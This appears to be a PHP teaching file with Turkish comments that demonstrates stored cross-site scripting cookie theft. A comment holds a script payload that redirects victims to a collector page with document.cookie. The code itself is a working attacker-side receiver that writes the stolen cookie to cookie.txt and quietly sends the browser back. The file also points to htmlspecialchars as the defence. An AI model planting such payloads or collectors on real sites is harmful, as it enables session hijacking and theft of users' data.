<?php 

//Farzedelim ki bu cookie uzak sunucuda bulunan bir cookie miz var
/*
Attacker kullanicisi da diyelim ki about kisminda script kodu ile href uzerinden uzak bir sunucuya yonlenecek bir kod yazdi script kodu diyelim

<script> window.location.href="cookie/cookie.php";</script>

hatta soyle veritabanina kaydoldugunu dusunelim 

<script> window.location.href="cookie/cookie.php?cookie=document.cookie";</script>
Bu cookielerimizi calmak istiyor direk olarak
http://localhost/test/PHP-works/php-security/croos-site-scripting/user.php?id=3
bu sekilde bir istek gonderildiginde sayfaya sayfaya giris de  yapildigi icn daha onceden girise izin verilecek kodlari calstirilacak ve disardan kullanici non kodlari direk cookie.php sayfasine yonlendirip orda da document.cookie yi alip kendi text dosyasina yazdirdigi icin cookileri calmis olacak bu sekilde, burda her turlu email,password,banknumarasi
Bunlari arka planda hic kullaniciya hissettirmeden de gonderilebiliyor
Her zaman verilerimizi alirken htmlspecialchars ile filtreleyerek sistemimizi korumus oolurz tam tersi de yani kullanicidan geleni tekrar calisacak koda cevirmek icin de htmlcharsdecode yi kullaniriz

*/
//BU SEKILDE GET ISTEGI GONDEREREK COOKIELERE ERISMEYE CALISIYOR
$cookie=$_GET["cookie"];
file_put_contents("cookie.txt",$cookie);
header("Location:".$_SERVER["HTTP_REFERER"]);//GELEN YERE GERI DONDUR DEMEKTIR BU HEADERS ALTINDA REFERER ISTEK YAPILAN ADRESI GOSTERIYORDU

?>